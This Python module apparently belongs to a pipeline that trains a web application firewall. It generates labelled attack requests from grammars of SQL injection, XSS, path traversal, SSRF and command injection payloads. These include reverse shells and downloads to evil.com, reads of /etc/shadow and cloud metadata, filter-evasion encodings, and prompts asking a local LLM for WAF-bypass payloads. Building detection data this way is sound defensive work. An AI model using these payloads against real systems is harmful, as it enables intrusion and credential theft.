"""
stages/3_data_augmentation/01_attack_synthesis.py
-------------------------------------------------
Module A — The Augmentation Governor + Synthetic Attack Engine

Merges: 01_encoding_mutations, 02_tamper_scripts, 03–06_grammar_*, 07_local_llm_payloads

Architecture:
  - Reads taxonomy_inventory.json → computes per-class gap → only generates what's needed
  - Unified Generator registry: Mutator | Tamper | Grammar | LocalLLM (all subclass BaseGenerator)
  - Probabilistic mutation CHAINS: Grammar → Tamper → Encode (not one-shot)
  - Schema-validated output via HttpRecord Pydantic model before Parquet write
  - ThreadPoolExecutor for parallel class generation

Run:
    python stages/3_data_augmentation/01_attack_synthesis.py --config config/pipeline.yaml [--model-path /path/to/model.gguf]
"""

from __future__ import annotations

import argparse
import json
import random
import re
import urllib.parse
import uuid
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

import pyarrow.parquet as pq

from ai_waf_v2.data.schema import HttpRecord, records_to_table
from ai_waf_v2.utils.config import load_config
from ai_waf_v2.utils.logging import configure_root, get_logger
from ai_waf_v2.utils.seed import seed_everything

log = get_logger(__name__)

TARGET_SAMPLES_PER_CLASS = 5_000   # default floor; overridden by pipeline.yaml if present

# ─────────────────────────────────────────────────────────────────────────────
# Grammar definitions  (consolidated from 03–06)
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class AttackGrammar:
    name:      str
    prefixes:  list[str]
    payloads:  list[str]
    suffixes:  list[str]
    params:    list[str]
    endpoints: list[str]
    methods:   list[str] = field(default_factory=lambda: ["GET", "POST"])


GRAMMAR_REGISTRY: dict[str, AttackGrammar] = {
    "sqli": AttackGrammar(
        name="sqli",
        prefixes=["'", '"', "1 OR", "1 AND", "1; ", "1/*", "' OR '1'='1", '" OR "1"="1'],
        payloads=[
            "UNION SELECT NULL", "UNION SELECT NULL,NULL", "UNION SELECT NULL,NULL,NULL",
            "UNION ALL SELECT 1,2,3", "UNION SELECT username,password FROM users",
            "AND 1=1", "AND 1=2", "OR 1=1", "OR SLEEP(5)", "AND SLEEP(5)",
            "WAITFOR DELAY '0:0:5'", "AND BENCHMARK(5000000,MD5(1))",
            "ORDER BY 1--", "ORDER BY 100--", "GROUP BY 1", "HAVING 1=1",
            "AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
            "AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))",
            "AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)",
        ],
        suffixes=["--", "-- -", "#", "/*", "/**/", ";--", "' --", '" --', ""],
        params=["id", "user_id", "item_id", "product_id", "order_id", "page",
                "search", "query", "q", "cat", "category", "filter", "sort",
                "offset", "limit", "key", "token", "session", "uid", "pid"],
        endpoints=["/api/v1/users", "/api/v1/products", "/api/v1/orders",
                   "/search", "/products", "/users", "/admin/users",
                   "/api/items", "/api/v2/data", "/shop/product"],
    ),
    "xss": AttackGrammar(
        name="xss",
        prefixes=["<", '"><', "';", "'><", "javascript:", "data:text/html,"],
        payloads=[
            "script>alert(1)</script", "script>alert('XSS')</script",
            "img src=x onerror=alert(1)>", "img src=x onerror=alert(document.cookie)>",
            "svg onload=alert(1)>", "body onload=alert(1)>",
            "iframe src=javascript:alert(1)>", "input autofocus onfocus=alert(1)>",
            "select autofocus onfocus=alert(1)>", "video><source onerror=alert(1)>",
            "a href=javascript:alert(1)>click</a",
            "math><mtext></mtext><script>alert(1)</script>",
            "details open ontoggle=alert(1)>",
            "script src=//evil.com/x.js></script",
        ],
        suffixes=["", ">", "/>", "</div>"],
        params=["name", "comment", "message", "description", "content", "title",
                "subject", "body", "text", "input", "value", "username", "email",
                "search", "q", "redirect", "url"],
        endpoints=["/comment", "/feedback", "/profile", "/search", "/post",
                   "/message", "/signup", "/login", "/api/v1/comments", "/api/v1/messages"],
        methods=["GET", "POST"],
    ),
    "lfi": AttackGrammar(
        name="lfi",
        prefixes=["", "../", "..\\", "....//", "..%2f"],
        payloads=[
            "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
            "../../../../etc/shadow", "..%2f..%2fetc%2fpasswd",
            "..%252f..%252fetc%252fpasswd", "..%c0%af..%c0%afetc%c0%afpasswd",
            "/etc/passwd", "/etc/shadow", "/proc/self/environ", "/proc/self/cmdline",
            "/var/log/apache2/access.log", "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        ],
        suffixes=["%00", "", "&", "?"],
        params=["file", "page", "path", "include", "doc", "document",
                "template", "load", "read", "view", "content", "dir"],
        endpoints=["/index.php", "/page.php", "/view.php", "/download.php",
                   "/api/file", "/api/v1/document", "/include", "/template"],
        methods=["GET"],
    ),
    "ssrf": AttackGrammar(
        name="ssrf",
        prefixes=["http://", "https://", "file://", "dict://", "gopher://", "ftp://"],
        payloads=[
            "169.254.169.254/latest/meta-data/", "169.254.169.254/latest/user-data/",
            "169.254.169.254/computeMetadata/v1/",
            "metadata.google.internal/computeMetadata/v1/",
            "localhost/admin", "localhost:8080", "127.0.0.1/admin", "0.0.0.0/admin",
            "127.1/admin", "[::1]/admin", "internal.service.local/api",
            "192.168.1.1", "10.0.0.1", "0177.0.0.1", "2130706433",
        ],
        suffixes=["", "/", "?debug=1"],
        params=["url", "uri", "href", "src", "source", "dest", "destination",
                "redirect", "proxy", "callback", "webhook", "next", "target",
                "load", "fetch", "request"],
        endpoints=["/api/v1/fetch", "/proxy", "/redirect",
                   "/api/webhook", "/api/v1/callback", "/api/url", "/api/external"],
        methods=["GET", "POST"],
    ),
    "cmdi": AttackGrammar(
        name="cmdi",
        prefixes=["; ", "| ", "|| ", "&& ", "`", "$(", "\n"],
        payloads=[
            "id", "whoami", "cat /etc/passwd", "cat /etc/shadow", "ls -la /",
            "uname -a", "ps aux", "env", "ping -c 1 evil.com",
            "curl http://evil.com/x", "wget http://evil.com/x",
            "bash -i >& /dev/tcp/evil.com/4444 0>&1",
            "nc -e /bin/sh evil.com 4444",
            "python3 -c 'import os; os.system(\"id\")'",
        ],
        suffixes=["", " #", " 2>&1", " > /dev/null", " &"],
        params=["cmd", "command", "exec", "run", "ping", "host",
                "ip", "query", "input", "shell", "terminal"],
        endpoints=["/api/ping", "/admin/exec", "/api/command",
                   "/api/v1/run", "/debug/exec", "/api/shell"],
        methods=["GET", "POST"],
    ),
}


# ─────────────────────────────────────────────────────────────────────────────
# Base Generator + concrete implementations
# ─────────────────────────────────────────────────────────────────────────────

class BaseGenerator(ABC):
    """All generator types share this interface so the Governor can treat them uniformly."""

    @abstractmethod
    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        """Return a list of raw payload strings (not wrapped HTTP requests)."""
        ...

    @property
    @abstractmethod
    def name(self) -> str: ...


class GrammarGenerator(BaseGenerator):
    """Samples from a context-free grammar to produce novel payloads."""

    @property
    def name(self) -> str:
        return "grammar"

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        if attack_class not in GRAMMAR_REGISTRY:
            log.warning(f"GrammarGenerator: no grammar for '{attack_class}'")
            return []
        g = GRAMMAR_REGISTRY[attack_class]
        payloads = []
        for _ in range(n):
            payloads.append(
                f"{rng.choice(g.prefixes)}{rng.choice(g.payloads)}{rng.choice(g.suffixes)}"
            )
        return payloads


class MutatorGenerator(BaseGenerator):
    """Applies encoding mutations to seed payloads loaded from the train split."""

    ENCODINGS: dict[str, Callable[[str, random.Random], str]] = {
        "url_encode":        lambda s, r: urllib.parse.quote(s, safe=""),
        "double_url_encode": lambda s, r: urllib.parse.quote(urllib.parse.quote(s, safe=""), safe=""),
        "partial_url_encode": lambda s, r: "".join(
            urllib.parse.quote(c, safe="") if not c.isalnum() and r.random() < 0.5 else c
            for c in s
        ),
        "hex_encode":        lambda s, r: "".join(
            f"0x{ord(c):02x}" if c.isalpha() else c for c in s
        ),
        "unicode_escape":    lambda s, r: "".join(
            f"\\u{ord(c):04x}" if c.isalpha() else c for c in s
        ),
        "html_entity":       lambda s, r: "".join(
            f"&#{ord(c)};" if c.isalpha() else c for c in s
        ),
        "comment_insertion": lambda s, r: re.sub(r"\s+", "/**/", s),
        "case_variation":    lambda s, r: "".join(
            c.upper() if r.random() > 0.5 else c.lower() for c in s
        ),
        "whitespace_bypass": lambda s, r: re.sub(
            r" ",
            lambda _: r.choice(["\t", "\n", "\r", "  ", "%09", "%0a", "%0d"]),
            s,
        ),
    }

    def __init__(self, seeds: list[str], enabled: list[str] | None = None):
        self.seeds   = seeds
        self.enabled = enabled or list(self.ENCODINGS.keys())

    @property
    def name(self) -> str:
        return "mutator"

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        if not self.seeds:
            return []
        payloads = []
        for _ in range(n):
            seed    = rng.choice(self.seeds)
            enc_key = rng.choice(self.enabled)
            enc_fn  = self.ENCODINGS[enc_key]
            payloads.append(enc_fn(seed, rng))
        return payloads


class TamperGenerator(BaseGenerator):
    """Applies sqlmap-style tamper transforms to seed payloads."""

    TAMPERS: dict[str, Callable[[str], str]] = {
        "apostrophe_mask":  lambda s: s.replace("'", "UTF8MB4_UNICODE_CI"),
        "modsecurity_safe": lambda s: s.replace("=", " LIKE ").replace("OR", "||"),
        "between":          lambda s: s.replace("=1", " BETWEEN 0 AND 2"),
        "ifnull2ifisnull":  lambda s: s.replace("IFNULL(", "IF(ISNULL("),
        "multiplespaces":   lambda s: s.replace(" ", "   "),
        "space2dash":       lambda s: s.replace(" ", "--\n"),
        "space2mssqlblank": lambda s: s.replace(" ", "\\t"),
    }

    def __init__(self, seeds: list[str]):
        self.seeds = seeds

    @property
    def name(self) -> str:
        return "tamper"

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        if not self.seeds:
            return []
        tamper_fns = list(self.TAMPERS.values())
        payloads   = []
        for _ in range(n):
            seed = rng.choice(self.seeds)
            fn   = rng.choice(tamper_fns)
            payloads.append(fn(seed))
        return payloads


class LocalLLMGenerator(BaseGenerator):
    """Generates payloads via a locally-hosted GGUF model (offline, no API key)."""

    PROMPTS = {
        "sqli":  "Generate 5 novel SQL injection payloads evading keyword filters (blind, error-based, second-order). One per line.",
        "xss":   "Generate 5 XSS payloads bypassing CSP/WAF (DOM-based, mutation, polyglot). One per line.",
        "ssrf":  "Generate 5 SSRF payloads targeting cloud metadata (IP encoding, protocol wrappers). One per line.",
        "cmdi":  "Generate 5 OS command injection payloads bypassing sanitization (metacharacters, env vars, encoding). One per line.",
        "lfi":   "Generate 5 LFI payloads (null-byte, encoding tricks, PHP wrappers). One per line.",
    }

    def __init__(self, model_path: str, max_new_tokens: int = 256):
        self._model_path    = model_path
        self._max_new_tokens = max_new_tokens
        self._llm           = None

    def _lazy_load(self):
        if self._llm is None:
            try:
                from llama_cpp import Llama
                self._llm = Llama(
                    model_path=self._model_path,
                    n_ctx=512, n_gpu_layers=-1, verbose=False,
                )
                log.info(f"LocalLLMGenerator: model loaded from {self._model_path}")
            except ImportError:
                raise ImportError(
                    "llama-cpp-python not installed. "
                    "pip install llama-cpp-python --extra-index-url "
                    "https://abetlen.github.io/llama-cpp-python/whl/cu124"
                )

    @property
    def name(self) -> str:
        return "local_llm"

    def generate_payloads(self, attack_class: str, n: int, rng: random.Random) -> list[str]:
        self._lazy_load()
        prompt = self.PROMPTS.get(attack_class)
        if not prompt:
            return []
        payloads: list[str] = []
        while len(payloads) < n:
            resp  = self._llm(f"[INST] {prompt} [/INST]",
                              max_tokens=self._max_new_tokens,
                              temperature=0.9, top_p=0.95,
                              stop=["\n\n", "###"])
            lines = [l.strip() for l in resp["choices"][0]["text"].splitlines()
                     if l.strip() and len(l.strip()) > 3 and not l.strip().endswith(":")]
            payloads.extend(lines)
        return payloads[:n]


# ─────────────────────────────────────────────────────────────────────────────
# Mutation chain  (the key new capability)
# ─────────────────────────────────────────────────────────────────────────────

def _build_chain(
    payload:    str,
    generators: list[BaseGenerator],
    chain_len:  int,
    attack_class: str,
    rng:        random.Random,
) -> str:
    """
    Probabilistic mutation chain.

    Randomly selects `chain_len` generators from the available pool and applies
    them sequentially so that a single seed is Grammar → Tamper → Encode in one
    pass rather than one-shot transformations.
    """
    pool = [g for g in generators if g.name in ("mutator", "tamper")]
    if not pool:
        return payload

    steps = rng.choices(pool, k=min(chain_len, len(pool)))
    result = payload
    for gen in steps:
        candidates = gen.generate_payloads(attack_class, 1, rng)
        if candidates:
            # Apply the generator as a transform on the current result
            result = candidates[0] if gen.name == "grammar" else _apply_to_string(gen, result, rng)
    return result


def _apply_to_string(gen: BaseGenerator, payload: str, rng: random.Random) -> str:
    """Apply a single Mutator/Tamper generator to an existing payload string."""
    if isinstance(gen, MutatorGenerator):
        enc_key = rng.choice(gen.enabled)
        return MutatorGenerator.ENCODINGS[enc_key](payload, rng)
    if isinstance(gen, TamperGenerator):
        fn = rng.choice(list(TamperGenerator.TAMPERS.values()))
        return fn(payload)
    return payload


# ─────────────────────────────────────────────────────────────────────────────
# Governor  —  reads the gap and dispatches generators
# ─────────────────────────────────────────────────────────────────────────────

class AugmentationGovernor:
    """
    Reads taxonomy_inventory.json and determines how many samples to generate
    per class, then orchestrates generators to fill the gap.
    """

    def __init__(
        self,
        inventory_path: Path,
        target_per_class: int,
        generators: list[BaseGenerator],
        chain_len: int = 2,
        rng_seed: int = 42,
    ):
        self.target          = target_per_class
        self.generators      = generators
        self.chain_len       = chain_len
        self.rng             = random.Random(rng_seed)

        self.class_counts: dict[str, int] = {}
        if inventory_path.exists():
            inv = json.loads(inventory_path.read_text())
            self.class_counts = {
                k: v for k, v in inv.get("class_counts", {}).items()
                if k != "benign"
            }
            log.info(f"Governor loaded inventory: {self.class_counts}")
        else:
            log.warning(f"Inventory not found at {inventory_path}; generating full target for all classes")

    def gaps(self) -> dict[str, int]:
        """Return {attack_class: n_needed} for classes below the target."""
        result = {}
        for cls in GRAMMAR_REGISTRY:
            current = self.class_counts.get(cls, 0)
            needed  = max(0, self.target - current)
            if needed > 0:
                result[cls] = needed
                log.info(f"  Gap: {cls:15s}  current={current:,}  need={needed:,}")
            else:
                log.info(f"  OK:  {cls:15s}  current={current:,}  (at or above target)")
        return result

    def synthesize_class(
        self,
        attack_class: str,
        n_needed:    int,
    ) -> list[str]:
        """
        Generate `n_needed` payload strings for `attack_class` by distributing
        the load across all registered generators and applying mutation chains.
        """
        grammar_gens = [g for g in self.generators if g.name == "grammar"]
        other_gens   = [g for g in self.generators if g.name != "grammar"]

        # Split: 40% grammar seeds, then mutated/tampered
        n_grammar = int(n_needed * 0.40)
        n_chains  = n_needed - n_grammar

        # Step 1: grammar baseline payloads
        raw_seeds: list[str] = []
        for g in grammar_gens:
            raw_seeds.extend(g.generate_payloads(attack_class, n_grammar, self.rng))

        # Step 2: non-grammar generators top-up (mutator, tamper, local_llm)
        if other_gens and raw_seeds:
            per_gen = max(1, n_chains // len(other_gens))
            for g in other_gens:
                raw_seeds.extend(g.generate_payloads(attack_class, per_gen, self.rng))

        # Step 3: apply probabilistic chains to produce final payloads
        final_payloads = []
        for seed in raw_seeds[:n_needed]:
            chained = _build_chain(seed, self.generators, self.chain_len, attack_class, self.rng)
            final_payloads.append(chained)

        return final_payloads[:n_needed]


# ─────────────────────────────────────────────────────────────────────────────
# HTTP record assembly (raw payload → validated HttpRecord)
# ─────────────────────────────────────────────────────────────────────────────

_UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "curl/7.88.1", "python-requests/2.28.2", "sqlmap/1.7",
]

_CLASS_META = {
    "sqli":  dict(method="GET",  param="q",    endpoint="/api/v1/search"),
    "xss":   dict(method="POST", param="msg",  endpoint="/api/v1/comment"),
    "ssrf":  dict(method="GET",  param="url",  endpoint="/api/v1/fetch"),
    "cmdi":  dict(method="POST", param="host", endpoint="/api/v1/ping"),
    "lfi":   dict(method="GET",  param="path", endpoint="/api/v1/file"),
}


def _payload_to_record(
    payload:      str,
    attack_class: str,
    source:       str,
    rng:          random.Random,
) -> HttpRecord | None:
    """
    Wrap a raw payload string in a realistic HTTP envelope and validate it
    against the HttpRecord Pydantic schema before returning.

    Returns None if schema validation fails (prevents broken-pipe errors
    in the training stage from malformed records reaching Parquet).
    """
    meta     = _CLASS_META.get(attack_class, dict(method="GET", param="input", endpoint="/api/data"))
    method   = meta["method"]
    param    = meta["param"]
    endpoint = meta["endpoint"]
    ua       = rng.choice(_UA_POOL)

    if method == "GET":
        qs, body = f"{param}={payload}", ""
    else:
        qs, body = "", f"{param}={payload}"

    headers = json.dumps({
        "Host":         "target.example.com",
        "User-Agent":   ua,
        "Accept":       "text/html,application/json,*/*",
        "Content-Type": "application/x-www-form-urlencoded" if body else "",
    })

    try:
        record = HttpRecord(
            id=str(uuid.uuid4()),
            method=method,
            path=endpoint,
            query_string=qs,
            headers=headers,
            body=body,
            label=1,
            attack_class=attack_class,
            source=source,
        ).build_raw()
        return record
    except Exception as e:
        log.debug(f"Schema validation failed for payload '{payload[:40]}': {e}")
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────

def _load_seed_payloads(splits_dir: Path) -> list[str]:
    """Extract raw query strings from the existing malicious train split as mutation seeds."""
    train_path = splits_dir / "train.parquet"
    if not train_path.exists():
        return []
    table = pq.read_table(train_path, filters=[("label", "=", 1)])
    rows  = table.to_pylist()
    return [r.get("query_string", "") or r.get("body", "") for r in rows if r.get("query_string") or r.get("body")]


def run(args: argparse.Namespace) -> None:
    configure_root()
    cfg = load_config(args.config)
    seed_everything(cfg.project.seed)

    aug_cfg  = cfg.augmentation
    target   = getattr(aug_cfg, "target_per_class", TARGET_SAMPLES_PER_CLASS)
    chain_len = getattr(aug_cfg, "chain_length", 2)

    splits_dir     = Path(cfg.paths.data_splits)
    inventory_path = Path(cfg.paths.reports) / "metrics" / "taxonomy_inventory.json"
    out_dir        = Path(cfg.paths.data_augmented) / "synthesis"
    out_dir.mkdir(parents=True, exist_ok=True)

    # Build generator pool
    seeds      = _load_seed_payloads(splits_dir)
    generators: list[BaseGenerator] = [
        GrammarGenerator(),
        MutatorGenerator(seeds, enabled=aug_cfg.rules.encodings if hasattr(aug_cfg, "rules") else None),
        TamperGenerator(seeds),
    ]

    model_path = args.model_path or getattr(getattr(aug_cfg, "local_llm", None), "model_path", None)
    if model_path and Path(model_path).exists():
        generators.append(LocalLLMGenerator(model_path, getattr(aug_cfg.local_llm, "max_new_tokens", 256)))
        log.info(f"LocalLLMGenerator enabled: {model_path}")
    else:
        log.info("LocalLLMGenerator skipped (no model path / model not found)")

    governor = AugmentationGovernor(
        inventory_path=inventory_path,
        target_per_class=target,
        generators=generators,
        chain_len=chain_len,
        rng_seed=cfg.project.seed,
    )

    gaps = governor.gaps()
    if not gaps:
        log.info("All classes meet the target — no augmentation needed.")
        return

    stats:        dict[str, int] = {}
    all_records:  list[HttpRecord] = []
    rng = random.Random(cfg.project.seed)

    def _synthesize_and_wrap(attack_class: str, n_needed: int) -> list[HttpRecord]:
        payloads = governor.synthesize_class(attack_class, n_needed)
        source   = f"aug_synthesis_{attack_class}"
        records  = []
        for p in payloads:
            r = _payload_to_record(p, attack_class, source, rng)
            if r:
                records.append(r)
        log.info(f"  {attack_class:15s}: {len(records):,}/{n_needed:,} valid records generated")
        return records

    # Parallel generation (one thread per attack class)
    max_workers = min(len(gaps), 4)
    with ThreadPoolExecutor(max_workers=max_workers) as pool:
        futures = {
            pool.submit(_synthesize_and_wrap, cls, n): cls
            for cls, n in gaps.items()
        }
        for future in as_completed(futures):
            cls     = futures[future]
            records = future.result()
            stats[cls]   = len(records)
            all_records += records

    # Write output
    if all_records:
        out_path = out_dir / "synthesized_attacks.parquet"
        pq.write_table(records_to_table(all_records), out_path, compression="snappy")
        log.info(f"Wrote {len(all_records):,} records → {out_path}")

    stats_path = Path(cfg.paths.reports) / "metrics" / "augmentation_synthesis.json"
    stats_path.parent.mkdir(parents=True, exist_ok=True)
    stats_path.write_text(json.dumps({
        "target_per_class": target,
        "chain_length":     chain_len,
        "generators_used":  [g.name for g in generators],
        "gaps_filled":      stats,
        "total_generated":  len(all_records),
    }, indent=2))
    log.info(f"Synthesis complete: {len(all_records):,} total records across {len(stats)} classes")

    try:
        import mlflow
        from ai_waf_v2.utils.mlflow_utils import init_experiment, log_metrics_dict
        init_experiment(cfg)
        with mlflow.start_run(run_name="01_attack_synthesis"):
            mlflow.log_params({
                "target_per_class": target,
                "chain_length":     chain_len,
                "generators_used":  [g.name for g in generators],
                "n_classes_filled": len(stats),
            })
            metrics: dict[str, float] = {"total_generated": float(len(all_records))}
            for cls, n in stats.items():
                metrics[f"generated_{cls}"] = float(n)
            log_metrics_dict(metrics)
            mlflow.log_artifact(str(stats_path))
    except Exception as exc:
        log.warning(f"MLflow logging skipped: {exc}", exc_info=True)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser()
    p.add_argument("--config",     default="config/pipeline.yaml")
    p.add_argument("--model-path", default=None, help="Path to local GGUF model (optional)")
    return p.parse_args()


if __name__ == "__main__":
    run(parse_args())